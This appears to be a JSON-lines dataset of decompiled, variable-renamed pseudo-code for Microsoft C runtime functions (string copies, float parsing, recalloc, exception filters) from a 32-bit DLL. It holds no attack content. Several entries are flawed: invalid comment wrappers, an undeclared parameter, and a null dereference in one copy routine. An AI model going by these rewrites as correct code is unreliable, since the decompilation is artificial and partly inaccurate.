{"Function Name": "___stdio_common_vswscanf", "Address": "100238c7", "Source Code": "void __cdecl\n___stdio_common_vswscanf\n(undefined4 param_1, undefined4 param_2, wchar_t *param_3, uint param_4, wchar_t *param_5,\n__crt_locale_pointers *param_6, char *param_7)\n{\n    \n    \n    common_vsscanf<wchar_t>(CONCAT44(param_2, param_1), param_3, param_4, param_5, param_6, param_7);\n}"}
{"Function Name": "__chvalidchk_l", "Address": "100238eb", "Source Code": "ushort __cdecl __chvalidchk_l(int index, ushort mask, int **pointerArray)\n{\n    \n    if (pointerArray == (int **)0x0) {\n        \n        return ___pctype_func()[index] & mask;\n    }\n    \n    \n    return (*(ushort *)(**pointerArray + index * 2)) & mask;\n}"}
{"Function Name": "__ischartype_l", "Address": "10023915", "Source Code": "void __cdecl __ischartype_l(int character_code, int character_type, _locale_t locale_pointer)\n{\n    \n    if (locale_pointer == (_locale_t)0x0 || (int)locale_pointer->locinfo->lc_codepage < 2) {\n        \n        __chvalidchk_l(character_code, (ushort)character_type, (int **)locale_pointer);\n    } else {\n        \n        __isctype_l(character_code, character_type, locale_pointer);\n    }\n}"}
{"Function Name": "_memcpy_s", "Address": "10023948", "Source Code": "errno_t __cdecl _memcpy_s(void *destination, rsize_t destinationSize, void *source, rsize_t maxCount)\n{\n    errno_t errorCode; \n    if (maxCount == 0) { \n        errorCode = 0; \n    } else if (destination == (void *)0x0) { \n        *(errno_t *)FUN_100253b8() = 0x16; \n        errorCode = 0x16; \n        FUN_1001de96(); \n    } else if (source == (void *)0x0 || destinationSize < maxCount) { \n        _memset(destination, 0, destinationSize); \n        if (source == (void *)0x0) { \n            *(errno_t *)FUN_100253b8() = 0x16; \n            errorCode = 0x16; \n        } else { \n            errorCode = (maxCount <= destinationSize) ? 0x16 : 0x22; \n            *(errno_t *)FUN_100253b8() = errorCode; \n        }\n        FUN_1001de96(); \n    } else { \n        FUN_10018670((undefined8 *)destination, (undefined8 *)source, maxCount); \n        errorCode = 0; \n    }\n    return errorCode; \n}"}
{"Function Name": "make_c_string_character_source<>", "Address": "100239fc", "Source Code": "void __cdecl make_c_string_character_source(undefined4 *character_source, undefined4 character_value, undefined4 *destination_pointer) {\n    \n    *character_source = character_value;\n    \n    \n    character_source[1] = destination_pointer;\n    \n    \n    if (destination_pointer != (undefined4 *)0x0) {\n        \n        *destination_pointer = character_value;\n    }\n}"}
{"Function Name": "FUN_100249c3", "Address": "100249c3", "Source Code": "int __cdecl FUN_100249c3(wchar_t *firstString,wchar_t *secondString)\n{\n    int pointerDifference; \n    \n    if (DAT_1005007c != 0) {\n        \n        return __wcsicmp_l(firstString,secondString,(_locale_t)0x0);\n    }\n    \n    \n    if (firstString != (wchar_t *)0x0 && secondString != (wchar_t *)0x0) {\n        \n        pointerDifference = (int)firstString - (int)secondString;\n        \n        \n        do {\n            \n            wchar_t currentCharFirst = *(wchar_t *)(pointerDifference + (int)secondString);\n            \n            \n            if ((0x40 < (ushort)currentCharFirst) && ((ushort)currentCharFirst < 0x5b)) {\n                currentCharFirst += L' ';\n            }\n            \n            \n            wchar_t currentCharSecond = *secondString;\n            \n            \n            if ((0x40 < (ushort)currentCharSecond) && ((ushort)currentCharSecond < 0x5b)) {\n                currentCharSecond += L' ';\n            }\n            \n            \n            secondString++;\n        } while (currentCharFirst != L'\\0' && currentCharFirst == currentCharSecond); \n        \n        \n        return (uint)(ushort)currentCharFirst - (uint)(ushort)currentCharSecond;\n    }\n    \n    \n    undefined4 *errorCodePointer = (undefined4 *)FUN_100253b8();\n    *errorCodePointer = 0x16; \n    FUN_1001de96(); \n    return 0x7fffffff; \n}"}
{"Function Name": "parse_floating_point<>", "Address": "10024ba3", "Source Code": "\\*\nvoid __cdecl parse_floating_point<>(_locale_t locale, byte *byte_pointer, byte **output_byte_pointer, double *output_double)\n{\n    floating_point_parse_result parse_result; \n    uint security_cookie; \n    \n    security_cookie = DAT_1004e008 ^ (uint)&stack0xfffffffc;\n    \n    if (output_double == (double *)0x0 || locale == (_locale_t)0x0) {\n        *(undefined4 *)FUN_100253b8() = 0x16; \n        FUN_1001de96(); \n    } else {\n        \n        parse_result = FUN_10024c19(locale, &byte_pointer, NULL);\n        \n        __crt_strtox::parse_floating_point_write_result<double>(parse_result, (floating_point_string *)NULL, output_double);\n    }\n    \n    if (output_byte_pointer != (byte **)0x0) {\n        *output_byte_pointer = byte_pointer; \n    }\n    \n    ___security_check_cookie_4(security_cookie ^ (uint)&stack0xfffffffc);\n    return; \n}\n*\\ \n \nvoid __cdecl parse_floating_point<>(_locale_t locale, byte *byte_pointer, byte **output_byte_pointer, double *output_double)\n{\n    floating_point_parse_result parse_result;\n    uint security_cookie;\n    security_cookie = DAT_1004e008 ^ (uint)&stack0xfffffffc;\n    if (output_double == (double *)0x0 || locale == (_locale_t)0x0) {\n        *(undefined4 *)FUN_100253b8() = 0x16;\n        FUN_1001de96();\n    } else {\n        parse_result = FUN_10024c19(locale, &byte_pointer, NULL);\n        __crt_strtox::parse_floating_point_write_result<double>(parse_result, (floating_point_string *)NULL, output_double);\n    }\n    if (output_byte_pointer != (byte **)0x0) {\n        *output_byte_pointer = byte_pointer;\n    }\n    ___security_check_cookie_4(security_cookie ^ (uint)&stack0xfffffffc);\n    return;\n}"}
{"Function Name": "FUN_10024c19", "Address": "10024c19", "Source Code": "floating_point_parse_result __cdecl FUN_10024c19(_locale_t param_1,byte **param_2,int *param_3)\n{\nint *piVar1;\nint *piVar2;\nbyte *pbVar3;\nbool bVar4;\nbool bVar5;\nint iVar6;\nuint uVar7;\nbyte *pbVar8;\nuint uVar9;\nfloating_point_parse_result fVar10;\nbyte bVar11;\nuint uVar12;\nint *piVar13;\nchar cVar14;\nbyte *local_14;\nint local_10;\nundefined4 local_9;\nchar local_5;\nbVar5 = __crt_strtox::c_string_character_source<wchar_t>::validate\n((c_string_character_source<wchar_t> *)param_2);\nif (!bVar5) {\nreturn 7;\n}\npbVar8 = *param_2;\nbVar11 = *pbVar8;\npbVar3 = pbVar8;\nwhile( true ) {\n*param_2 = pbVar3 + 1;\nlocal_9 = CONCAT31(local_9._1_3_,bVar11);\niVar6 = __ischartype_l((uint)bVar11,8,param_1);\nif (iVar6 == 0) break;\npbVar3 = *param_2;\nbVar11 = *pbVar3;\n}\npiVar2 = param_3 + 0xc2;\n*(bool *)piVar2 = (byte)local_9 == 0x2d;\nif (((byte)local_9 == 0x2d) || (bVar11 = (byte)local_9, (byte)local_9 == 0x2b)) {\nbVar11 = **param_2;\nlocal_9 = CONCAT31(local_9._1_3_,bVar11);\n*param_2 = *param_2 + 1;\n}\nif ((bVar11 == 0x49) || (bVar11 == 0x69)) {\nfVar10 = FUN_10024ff6((char *)&local_9,(char **)param_2,(char *)pbVar8);\nreturn fVar10;\n}\nif ((bVar11 == 0x4e) || (bVar11 == 0x6e)) {\nfVar10 = __crt_strtox::\nparse_floating_point_possible_nan<char,class___crt_strtox::c_string_character_source<char>,char_const*>\n((char *)&local_9,(c_string_character_source<char> *)param_2,(char *)pbVar8);\nreturn fVar10;\n}\nlocal_5 = '\\0';\nlocal_14 = pbVar8;\nif (bVar11 == 0x30) {\nlocal_14 = *param_2;\nbVar11 = *local_14;\n*param_2 = local_14 + 1;\nif ((bVar11 == 0x78) || (bVar11 == 0x58)) {\nbVar11 = local_14[1];\nlocal_5 = '\\x01';\nlocal_9 = CONCAT31(local_9._1_3_,bVar11);\n*param_2 = local_14 + 2;\n}\nelse {\n__crt_strtox::c_string_character_source<char>::unget\n((c_string_character_source<char> *)param_2,bVar11);\nlocal_14 = pbVar8;\nbVar11 = (byte)local_9;\n}\n}\nlocal_10 = 0;\npiVar1 = param_3 + 2;\nuVar9 = (uint)bVar11;\nif (bVar11 == 0x30) {\nuVar9 = 0x100;\ndo {\nbVar11 = **param_2;\nuVar9 = CONCAT31((int3)(uVar9 >> 8),bVar11);\nlocal_9 = CONCAT31(local_9._1_3_,bVar11);\n*param_2 = *param_2 + 1;\n} while (bVar11 == 0x30);\n}\nuVar12 = ((local_5 == '\\0') - 1 & 6) + 9;\npiVar13 = piVar1;\nwhile( true ) {\ncVar14 = (char)uVar9;\nif ((byte)(cVar14 - 0x30U) < 10) {\nuVar7 = (int)cVar14 - 0x30;\n}\nelse if ((byte)(cVar14 + 0x9fU) < 0x1a) {\nuVar7 = (int)cVar14 - 0x57;\n}\nelse if ((byte)(cVar14 + 0xbfU) < 0x1a) {\nuVar7 = (int)cVar14 - 0x37;\n}\nelse {\nuVar7 = 0xffffffff;\n}\nif (uVar12 < uVar7) break;\nif (piVar13 != piVar2) {\n*(char *)piVar13 = (char)uVar7;\npiVar13 = (int *)((int)piVar13 + 1);\n}\nlocal_10 = local_10 + 1;\nbVar11 = **param_2;\nuVar9 = (uint)CONCAT11(1,bVar11);\nlocal_9 = CONCAT31(local_9._1_3_,bVar11);\n*param_2 = *param_2 + 1;\n}\nif (cVar14 == *(char *)*param_1->locinfo->ctype1_refcount) {\nbVar11 = **param_2;\nuVar9 = CONCAT31((int3)(uVar9 >> 8),bVar11);\npbVar8 = *param_2 + 1;\nlocal_9 = CONCAT31(local_9._1_3_,bVar11);\n*param_2 = pbVar8;\nif ((piVar13 == piVar1) && (bVar11 == 0x30)) {\nuVar9 = 0x100;\ndo {\nbVar11 = *pbVar8;\nuVar9 = CONCAT31((int3)(uVar9 >> 8),bVar11);\nlocal_10 = local_10 + -1;\npbVar8 = pbVar8 + 1;\nlocal_9 = CONCAT31(local_9._1_3_,bVar11);\n*param_2 = pbVar8;\n} while (bVar11 == 0x30);\n}\nwhile( true ) {\ncVar14 = (char)uVar9;\nif ((byte)(cVar14 - 0x30U) < 10) {\nuVar7 = (int)cVar14 - 0x30;\n}\nelse if ((byte)(cVar14 + 0x9fU) < 0x1a) {\nuVar7 = (int)cVar14 - 0x57;\n}\nelse if ((byte)(cVar14 + 0xbfU) < 0x1a) {\nuVar7 = (int)cVar14 - 0x37;\n}\nelse {\nuVar7 = 0xffffffff;\n}\nif (uVar12 < uVar7) break;\nif (piVar13 != piVar2) {\n*(char *)piVar13 = (char)uVar7;\npiVar13 = (int *)((int)piVar13 + 1);\n}\nbVar11 = **param_2;\nuVar9 = (uint)CONCAT11(1,bVar11);\nlocal_9 = CONCAT31(local_9._1_3_,bVar11);\n*param_2 = *param_2 + 1;\n}\n}\nif ((char)(uVar9 >> 8) == '\\0') {\n__crt_strtox::c_string_character_source<char>::unget\n((c_string_character_source<char> *)param_2,(char)local_9);\n*param_2 = local_14;\nreturn ((local_5 == '\\0') - 1 & 0xfffffffb) + 7;\n}\n__crt_strtox::c_string_character_source<char>::unget\n((c_string_character_source<char> *)param_2,(char)local_9);\npbVar3 = *param_2;\nbVar11 = *pbVar3;\npbVar8 = pbVar3 + 1;\n*param_2 = pbVar8;\nif (bVar11 == 0x45) {\nLAB_10024e54:\ncVar14 = local_5 == '\\0';\n}\nelse {\nif (bVar11 != 0x50) {\nif (bVar11 == 0x65) goto LAB_10024e54;\ncVar14 = '\\0';\nif (bVar11 != 0x70) goto LAB_10024e5b;\n}\ncVar14 = local_5;\n}\nLAB_10024e5b:\niVar6 = 0;\nlocal_9._0_1_ = bVar11;\nif (cVar14 != '\\0') {\nlocal_9._0_1_ = *pbVar8;\nbVar5 = (byte)local_9 == 0x2d;\n*param_2 = pbVar3 + 2;\nif (((byte)local_9 == 0x2b) || ((byte)local_9 == 0x2d)) {\nlocal_9._0_1_ = pbVar3[2];\n*param_2 = pbVar3 + 3;\n}\nbVar4 = false;\nif ((byte)local_9 == 0x30) {\nbVar4 = true;\ndo {\nlocal_9._0_1_ = **param_2;\n*param_2 = *param_2 + 1;\n} while ((byte)local_9 == 0x30);\n}\nwhile( true ) {\nif ((byte)((byte)local_9 - 0x30) < 10) {\nuVar9 = (int)(char)(byte)local_9 - 0x30;\n}\nelse if ((byte)((byte)local_9 + 0x9f) < 0x1a) {\nuVar9 = (int)(char)(byte)local_9 - 0x57;\n}\nelse if ((byte)((byte)local_9 + 0xbf) < 0x1a) {\nuVar9 = (int)(char)(byte)local_9 - 0x37;\n}\nelse {\nuVar9 = 0xffffffff;\n}\nif (9 < uVar9) goto LAB_10024ef7;\nbVar4 = true;\niVar6 = iVar6 * 10 + uVar9;\nif (0x1450 < iVar6) break;\nlocal_9._0_1_ = **param_2;\n*param_2 = *param_2 + 1;\n}\niVar6 = 0x1451;\nLAB_10024ef7:\nwhile( true ) {\nif ((byte)((byte)local_9 - 0x30) < 10) {\nuVar9 = (int)(char)(byte)local_9 - 0x30;\n}\nelse if ((byte)((byte)local_9 + 0x9f) < 0x1a) {\nuVar9 = (int)(char)(byte)local_9 - 0x57;\n}\nelse if ((byte)((byte)local_9 + 0xbf) < 0x1a) {\nuVar9 = (int)(char)(byte)local_9 - 0x37;\n}\nelse {\nuVar9 = 0xffffffff;\n}\nif (9 < uVar9) break;\nlocal_9._0_1_ = **param_2;\n*param_2 = *param_2 + 1;\n}\nif (bVar5) {\niVar6 = -iVar6;\n}\nif (!bVar4) {\n__crt_strtox::c_string_character_source<char>::unget\n((c_string_character_source<char> *)param_2,(byte)local_9);\n*param_2 = pbVar3;\nlocal_9._0_1_ = *pbVar3;\n*param_2 = pbVar8;\n}\n}\n__crt_strtox::c_string_character_source<char>::unget\n((c_string_character_source<char> *)param_2,(byte)local_9);\nif (piVar13 != piVar1) {\ndo {\nif (*(char *)((int)piVar13 + -1) != '\\0') break;\npiVar13 = (int *)((int)piVar13 + -1);\n} while (piVar13 != piVar1);\nif (piVar13 != piVar1) {\nif (0x1450 < iVar6) {\nreturn 9;\n}\nif (-0x1451 < iVar6) {\niVar6 = iVar6 + (((local_5 == '\\0') - 1 & 3) + 1) * local_10;\nif (0x1450 < iVar6) {\nreturn 9;\n}\nif (-0x1451 < iVar6) {\n*param_3 = iVar6;\nparam_3[1] = (int)piVar13 - (int)piVar1;\nreturn (uint)(local_5 != '\\0');\n}\n}\nreturn 8;\n}\n}\nreturn 2;\n}\nLocal Variable: local_5 : undefined1\nLocal Variable: local_9 : undefined4\nLocal Variable: local_10 : undefined4\nLocal Variable: local_14 : undefined4\nLocal Variable: local_18 : undefined4\nLocal Variable: local_1c : undefined4"}
{"Function Name": "FUN_10024ff6", "Address": "10024ff6", "Source Code": "undefined4 __cdecl FUN_10024ff6(char *input_string, char **char_pointer, char *unused_param)\n{\n    int index = 0; \n    undefined4 return_value = 3; \n    char current_char; \n    \n    while ((*input_string == (&DAT_1003ec48)[index] || (*input_string == (&DAT_1003ec4c)[index]))) {\n        current_char = **char_pointer; \n        index++; \n        *char_pointer += 1; \n        *input_string = current_char; \n        if (index == 3) { \n            \n            __crt_strtox::c_string_character_source<char>::unget((c_string_character_source<char> *)char_pointer, current_char);\n            current_char = **char_pointer; \n            *char_pointer += 1; \n            *input_string = current_char; \n            index = 0; \n            \n            while ((*input_string == \"INITY\"[index] || (*input_string == \"inity\"[index]))) {\n                current_char = **char_pointer; \n                index++; \n                *char_pointer += 1; \n                *input_string = current_char; \n                if (index == 5) { \n                    \n                    __crt_strtox::c_string_character_source<char>::unget((c_string_character_source<char> *)char_pointer, current_char);\n                    return 3; \n                }\n            }\n            \n            __crt_strtox::c_string_character_source<char>::unget((c_string_character_source<char> *)char_pointer, *input_string);\n            *input_string = '\\0'; \n            return return_value; \n        }\n    }\n    return_value = 7; \n    \n    __crt_strtox::c_string_character_source<char>::unget((c_string_character_source<char> *)char_pointer, *input_string);\n    *input_string = '\\0'; \n    return return_value; \n}"}
{"Function Name": "FID_conflict:_atof", "Address": "10025249", "Source Code": "double __cdecl FID_conflict__atof(wchar_t *wideCharStr)\n{\n    \n    \n    return (double)common_atof_l<>((int)wideCharStr, (__acrt_ptd **)0x0);\n}"}
{"Function Name": "common_tcsncpy_s<wchar_t>", "Address": "1002525c", "Source Code": "\\*\nint __cdecl common_tcsncpy_s<wchar_t>(wchar_t *destination_buffer, uint source_length, wchar_t *source_string, uint destination_length)\n{\n    wchar_t current_character; \n    uint remaining_destination_length = destination_length; \n    uint remaining_source_length = source_length; \n    wchar_t *destination_pointer = destination_buffer; \n    \n    if (destination_length == 0) {\n        \n        if (destination_buffer == (wchar_t *)0x0 && source_length == 0) {\n            return 0;\n        }\n        *destination_buffer = L'\\0'; \n        return 0; \n    }\n    \n    if (source_string != (wchar_t *)0x0) {\n        \n        if (destination_length == 0xffffffff) {\n            do {\n                \n                current_character = *(wchar_t *)(((int)source_string - (int)destination_buffer) + (int)destination_pointer);\n                *destination_pointer = current_character; \n                destination_pointer++; \n                if (current_character == L'\\0') break; \n                remaining_source_length--; \n            } while (remaining_source_length != 0); \n        } else {\n            do {\n                \n                current_character = *(wchar_t *)(((int)source_string - (int)destination_buffer) + (int)destination_pointer);\n                *destination_pointer = current_character; \n                destination_pointer++; \n                if ((current_character == L'\\0') || (remaining_destination_length-- == 0)) break; \n            } while (remaining_destination_length != 0); \n            if (remaining_destination_length == 0) {\n                *destination_pointer = L'\\0'; \n            }\n        }\n    } else {\n        \n        do {\n            current_character = *(wchar_t *)(((int)source_string - (int)destination_buffer) + (int)destination_pointer);\n            *destination_pointer = current_character; \n            destination_pointer++; \n            if ((current_character == L'\\0') || (remaining_source_length-- == 0)) break; \n        } while (remaining_source_length != 0); \n        if (remaining_source_length == 0) {\n            *destination_pointer = L'\\0'; \n        }\n    }\n    \n    if (remaining_source_length != 0) {\n        return 0; \n    }\n    \n    if (destination_length == 0xffffffff) {\n        destination_buffer[source_length - 1] = L'\\0'; \n        return 0x50; \n    }\n    *destination_buffer = L'\\0'; \n    int *error_code_pointer = (int *)FUN_100253b8(); \n    *error_code_pointer = 0x22; \n    FUN_1001de96(); \n    return 0x22; \n}\n*\\ \n \nint __cdecl common_tcsncpy_s<wchar_t>(wchar_t *destination_buffer, uint source_length, wchar_t *source_string, uint destination_length)\n{\n    wchar_t current_character;\n    uint remaining_destination_length = destination_length;\n    uint remaining_source_length = source_length;\n    wchar_t *destination_pointer = destination_buffer;\n    if (destination_length == 0) {\n        if (destination_buffer == (wchar_t *)0x0 && source_length == 0) {\n            return 0;\n        }\n        *destination_buffer = L'\\0';\n        return 0;\n    }\n    if (source_string != (wchar_t *)0x0) {\n        if (destination_length == 0xffffffff) {\n            do {\n                current_character = *(wchar_t *)(((int)source_string - (int)destination_buffer) + (int)destination_pointer);\n                *destination_pointer = current_character;\n                destination_pointer++;\n                if (current_character == L'\\0') break;\n                remaining_source_length--;\n            } while (remaining_source_length != 0);\n        } else {\n            do {\n                current_character = *(wchar_t *)(((int)source_string - (int)destination_buffer) + (int)destination_pointer);\n                *destination_pointer = current_character;\n                destination_pointer++;\n                if ((current_character == L'\\0') || (remaining_destination_length-- == 0)) break;\n            } while (remaining_destination_length != 0);\n            if (remaining_destination_length == 0) {\n                *destination_pointer = L'\\0';\n            }\n        }\n    } else {\n        do {\n            current_character = *(wchar_t *)(((int)source_string - (int)destination_buffer) + (int)destination_pointer);\n            *destination_pointer = current_character;\n            destination_pointer++;\n            if ((current_character == L'\\0') || (remaining_source_length-- == 0)) break;\n        } while (remaining_source_length != 0);\n        if (remaining_source_length == 0) {\n            *destination_pointer = L'\\0';\n        }\n    }\n    if (remaining_source_length != 0) {\n        return 0;\n    }\n    if (destination_length == 0xffffffff) {\n        destination_buffer[source_length - 1] = L'\\0';\n        return 0x50;\n    }\n    *destination_buffer = L'\\0';\n    int *error_code_pointer = (int *)FUN_100253b8();\n    *error_code_pointer = 0x22;\n    FUN_1001de96();\n    return 0x22;\n}"}
{"Function Name": "FUN_10025329", "Address": "10025329", "Source Code": "void __cdecl FUN_10025329(wchar_t *destination_buffer, uint destination_size, wchar_t *source_string, uint num_characters_to_copy)\n{\n    \n    \n    \n    \n    common_tcsncpy_s<wchar_t>(destination_buffer, destination_size, source_string, num_characters_to_copy);\n}"}
{"Function Name": "FUN_10025334", "Address": "10025334", "Source Code": "void FUN_10025334(size_t size_param) \n{\n    __malloc_base(size_param); \n}"}
{"Function Name": "FID_conflict:___acrt_errno_from_os_error", "Address": "1002533f", "Source Code": "int __cdecl FID_conflict____acrt_errno_from_os_error(ulong input_param)\n{\n    uint index = 0; \n    do {\n        \n        if (input_param == (&value_array)[index * 2]) {\n            \n            return (&result_array)[index * 2];\n        }\n        index++; \n    } while (index < 0x2c); \n    \n    \n    if (input_param - 0x13 < 0x12) {\n        return 0xd; \n    }\n    \n    \n    return (-(uint)(0xe < input_param - 0xbc) & 0xe) + 8; \n}"}
{"Function Name": "___acrt_errno_map_os_error", "Address": "10025382", "Source Code": "void __cdecl ___acrt_errno_map_os_error(ulong os_error_code)\n{\n    \n    *(ulong *)get_error_storage() = os_error_code;\n    \n    *(int *)get_runtime_error_storage() = map_os_error_to_runtime_error(os_error_code);\n}"}
{"Function Name": "_wcscat_s", "Address": "100253cb", "Source Code": "errno_t __cdecl _wcscat_s(wchar_t *destinationString, rsize_t availableSize, wchar_t *sourceString)\n{\n    wchar_t *destinationPtr; \n    int offset; \n    errno_t errorCode; \n    \n    if ((destinationString != (wchar_t *)0x0) && (availableSize != 0)) {\n        destinationPtr = destinationString; \n        \n        if (sourceString != (wchar_t *)0x0) {\n            \n            while (*destinationPtr != L'\\0' && availableSize != 0) {\n                destinationPtr++; \n                availableSize--; \n            }\n            \n            if (availableSize != 0) {\n                offset = (int)sourceString - (int)destinationPtr; \n                \n                while (availableSize != 0) {\n                    *destinationPtr = *(wchar_t *)(offset + (int)destinationPtr); \n                    if (*destinationPtr == L'\\0') break; \n                    destinationPtr++; \n                    availableSize--; \n                }\n                \n                if (availableSize != 0) {\n                    return 0; \n                }\n            }\n        }\n        *destinationString = L'\\0'; \n    }\n    \n    errorCode = (sourceString == (wchar_t *)0x0) ? 0x16 : 0x22;\n    *(errno_t *)FUN_100253b8() = errorCode; \n    FUN_1001de96(); \n    return errorCode; \n}"}
{"Function Name": "_wcscpy_s", "Address": "10025440", "Source Code": "errno_t __cdecl _wcscpy_s(wchar_t *destination, rsize_t size_in_words, wchar_t *source)\n{\n    wchar_t *dest_ptr; \n    errno_t error_code;   \n    \n    if ((destination != (wchar_t *)0x0) && (size_in_words != 0)) {\n        \n        if (source != (wchar_t *)0x0) {\n            dest_ptr = destination; \n            do {\n                *dest_ptr = *source; \n                if (*source == L'\\0') break; \n                dest_ptr++; \n                source++; \n                size_in_words--; \n            } while (size_in_words != 0); \n            \n            if (size_in_words != 0) {\n                *destination = L'\\0'; \n                return 0; \n            }\n        }\n        *destination = L'\\0'; \n    }\n    \n    error_code = (source == (wchar_t *)0x0) ? 0x16 : 0x22; \n    *(errno_t *)FUN_100253b8() = error_code; \n    FUN_1001de96(); \n    return error_code; \n}"}
{"Function Name": "FUN_100254a4", "Address": "100254a4", "Source Code": "void FUN_100254a4(LPCVOID memory_pointer, uint size, uint count)\n{\n    \n    __recalloc_base(memory_pointer, size, count);\n}"}
{"Function Name": "__recalloc_base", "Address": "100254af", "Source Code": "LPVOID __cdecl __recalloc_base(LPCVOID existing_memory, uint num_elements, uint element_size)\n{\n    LPVOID reallocated_memory; \n    SIZE_T existing_size; \n    uint total_size_needed;   \n    \n    if ((num_elements == 0) || (element_size <= 0xffffffe0 / num_elements)) {\n        \n        existing_size = (existing_memory == (LPCVOID)0x0) ? 0 : FUN_1002bebf(existing_memory);\n        \n        total_size_needed = num_elements * element_size;\n        \n        reallocated_memory = __realloc_base(existing_memory, total_size_needed);\n        \n        if ((reallocated_memory != (LPVOID)0x0) && (existing_size < total_size_needed)) {\n            \n            _memset((void *)((int)reallocated_memory + existing_size), 0, total_size_needed - existing_size);\n        }\n    } else {\n        \n        reallocated_memory = (LPVOID)0x0;\n        \n        *(undefined4 *)FUN_100253b8() = 0xc;\n    }\n    \n    return reallocated_memory;\n}"}
{"Function Name": "FUN_1002554d", "Address": "1002554d", "Source Code": "void __cdecl FUN_1002554d(char **inputParameter)\n{\n    \n    __crt_state_management::dual_state_global<char**>::initialize((dual_state_global<char**> *)&globalState, inputParameter);\n}"}
{"Function Name": "__callnewh", "Address": "10025561", "Source Code": "int __cdecl __callnewh(size_t size) \n{\n    uint modifiedValue; \n    code *newHandler; \n    modifiedValue = globalVariable ^ (uint)&stack0xfffffffc; \n    newHandler = (code *)queryNewHandler(); \n    if (newHandler != (code *)0x0) { \n        (*(code *)guardCheckFunction)(size); \n        (*newHandler)(); \n    }\n    return securityCheckResult(modifiedValue ^ (uint)&stack0xfffffffc); \n}"}
{"Function Name": "__seh_filter_dll", "Address": "100255f7", "Source Code": "undefined4 __cdecl __seh_filter_dll(int inputValue, uint *statusPointer)\n{\n    \n    if (inputValue != -0x1f928c9d) {\n        \n        return 0;\n    }\n    \n    return __seh_filter_exe(0xe06d7363, statusPointer);\n}"}
{"Function Name": "__seh_filter_exe", "Address": "10025617", "Source Code": "void __cdecl __seh_filter_exe(uint inputValue, uint *outputPointer)\n{\n    uint *resultPointer; \n    code *functionPointer; \n    uint *iteratorPointer; \n    resultPointer = *FUN_10029372(); \n    if (resultPointer != (uint *)0x0) { \n        for (iteratorPointer = resultPointer; iteratorPointer != resultPointer + 0x24; iteratorPointer += 3) { \n            if (*iteratorPointer == inputValue) goto LAB_1002565a; \n        }\n        iteratorPointer = (uint *)0x0; \n    LAB_1002565a:\n        if ((iteratorPointer != (uint *)0x0) && (functionPointer = (code *)iteratorPointer[2], functionPointer != (code *)0x0)) { \n            if (functionPointer == (code *)0x5) { \n                iteratorPointer[2] = 0; \n            } else if (functionPointer != (code *)0x1) { \n                uint *tempValue = resultPointer[1]; \n                resultPointer[1] = outputPointer; \n                if (iteratorPointer[1] == 8) { \n                    for (uint *arrayIterator = resultPointer + 9; arrayIterator != resultPointer + 0x24; arrayIterator += 3) { \n                        arrayIterator[2] = 0; \n                    }\n                    if (*iteratorPointer < 0xc0000092) { \n                        if (*iteratorPointer == 0xc0000091) { \n                            resultPointer[2] = (uint *)0x84; \n                        } else if (*iteratorPointer == 0xc000008d) {\n                            resultPointer[2] = (uint *)0x82; \n                        } else if (*iteratorPointer == 0xc000008e) {\n                            resultPointer[2] = (uint *)0x83; \n                        } else if (*iteratorPointer == 0xc000008f) {\n                            resultPointer[2] = (uint *)0x86; \n                        } else if (*iteratorPointer == 0xc0000090) {\n                            resultPointer[2] = (uint *)0x81; \n                        }\n                    } else if (*iteratorPointer == 0xc0000092) { \n                        resultPointer[2] = (uint *)0x8a; \n                    } else if (*iteratorPointer == 0xc0000093) { \n                        resultPointer[2] = (uint *)0x85; \n                    } else if (*iteratorPointer == 0xc00002b4) { \n                        resultPointer[2] = (uint *)0x8e; \n                    } else if (*iteratorPointer == 0xc00002b5) { \n                        resultPointer[2] = (uint *)0x8d; \n                    }\n                    (*(code *)PTR__guard_check_icall_1003a2f8)(8, resultPointer[2]); \n                    (*functionPointer)(); \n                    resultPointer[2] = resultPointer; \n                } else {\n                    iteratorPointer[2] = 0; \n                    (*(code *)PTR__guard_check_icall_1003a2f8)(iteratorPointer[1]); \n                    (*functionPointer)(); \n                }\n                resultPointer[1] = tempValue; \n            }\n        }\n    }\n    ___security_check_cookie_4(securityCookie ^ (uint)&stack0xfffffffc); \n    return; \n}"}
{"Function Name": "operator()<>", "Address": "1002578a", "Source Code": "\\*\nvoid operator()<>(int *resource_lock, int **resource_pointer) \n{\n    ___acrt_lock(*param_1); \n    FUN_100257f5(resource_pointer);  \n    FUN_100257c1();         \n}\n*\\ \n \nvoid operator()<>(int *resource_lock,int **resource_pointer)\n{\n    ___acrt_lock(*param_1);\n    FUN_100257f5(resource_pointer);\n    FUN_100257c1();\n}"}
{"Function Name": "__acrt_lock_and_call<>", "Address": "100257cd", "Source Code": "\\*\nvoid __cdecl __acrt_lock_and_call<>(int input_value, int **pointer_array)\n{\n    \n    operator()<>(&input_value, pointer_array);\n    \n    \n    return;\n}\n*\\ \n \nvoid __cdecl __acrt_lock_and_call<>(int input_value, int **pointer_array)\n{\n    operator()<>(&input_value, pointer_array);\n    return;\n}"}
{"Function Name": "FUN_100258d1", "Address": "100258d1", "Source Code": "bool __cdecl FUN_100258d1(int inputParameter)\n{\n    \n    return inputParameter == -0x1f928c9d;\n}"}
{"Function Name": "___scrt_is_managed_app", "Address": "1002597c", "Source Code": "uint ___scrt_is_managed_app(void) \n{\n    HMODULE moduleHandle; \n    moduleHandle = GetModuleHandleW((LPCWSTR)0x0); \n    if (moduleHandle != (HMODULE)0x0 && \n        *(short *)&moduleHandle->unused == 0x5a4d && \n        *(short *)&((HMODULE)((int)&moduleHandle->unused + moduleHandle[0xf].unused))[6].unused == 0x10b && \n        (0xe < (uint)moduleHandle[0x1d].unused)) { \n        return CONCAT31((int3)((uint)moduleHandle >> 8), moduleHandle[0x3a].unused != 0); \n    }\n    return 0; \n}"}
{"Function Name": "try_cor_exit_process", "Address": "100259c0", "Source Code": "void __cdecl try_cor_exit_process(uint param_1)\n{\n    BOOL isModuleLoaded; \n    FARPROC functionAddress; \n    uint securityCookieCheck = DAT_1004e008 ^ (uint)&stack0xfffffffc; \n    HMODULE moduleHandle = (HMODULE)0x0; \n    isModuleLoaded = GetModuleHandleExW(0, L\"mscoree.dll\", &moduleHandle); \n    if (isModuleLoaded && (functionAddress = GetProcAddress(moduleHandle, \"CorExitProcess\"))) { \n        (*(code *)PTR__guard_check_icall_1003a2f8)(param_1); \n        (*functionAddress)(); \n    }\n    if (moduleHandle) { \n        FreeLibrary(moduleHandle); \n    }\n    ___security_check_cookie_4(securityCookieCheck ^ (uint)&stack0xfffffffc); \n}"}
{"Function Name": "FUN_10025a2a", "Address": "10025a2a", "Source Code": "void __cdecl FUN_10025a2a(undefined4 input_param) \n{\n    global_variable = input_param; \n}"}
